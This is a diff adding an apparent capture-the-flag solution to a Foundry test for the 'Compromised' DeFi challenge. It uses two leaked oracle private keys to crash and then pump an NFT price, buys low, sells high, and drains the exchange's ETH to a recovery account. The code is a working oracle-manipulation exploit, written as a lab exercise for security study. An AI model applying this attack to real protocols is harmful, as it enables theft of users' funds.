@@ -75,7 +75,46 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        // The two leaked keys, decoded from the server response
+        uint256 pk1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
+        uint256 pk2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
+        address source1 = vm.addr(pk1);
+        address source2 = vm.addr(pk2);
+
+        // 1. Two of three reporters -> we control the median. Crash the price.
+        _setPrice(source1, 0);
+        _setPrice(source2, 0);
+
+        // 2. Buy one NFT for 1 wei (it is refunded, the price is 0)
+        vm.startPrank(player);
+        uint256 id = exchange.buyOne{value: 1 wei}();
+        vm.stopPrank();
+
+        // 3. Pump the price to everything the exchange holds
+        uint256 pumped = address(exchange).balance;
+        _setPrice(source1, pumped);
+        _setPrice(source2, pumped);
+
+        // 4. Sell the NFT back at the inflated price
+        vm.startPrank(player);
+        nft.approve(address(exchange), id);
+        exchange.sellOne(id);
+        vm.stopPrank();
+
+        // 5. Restore the original price so the final oracle check passes
+        _setPrice(source1, INITIAL_NFT_PRICE);
+        _setPrice(source2, INITIAL_NFT_PRICE);
+
+        // 6. Send the proceeds to the recovery account
+        vm.startPrank(player);
+        (bool ok,) = recovery.call{value: EXCHANGE_INITIAL_ETH_BALANCE}("");
+        require(ok, "transfer to recovery failed");
+        vm.stopPrank();
+    }
+
+    function _setPrice(address source, uint256 price) private {
+        vm.prank(source);
+        oracle.postPrice("DVNFT", price);
     }
 
     /**
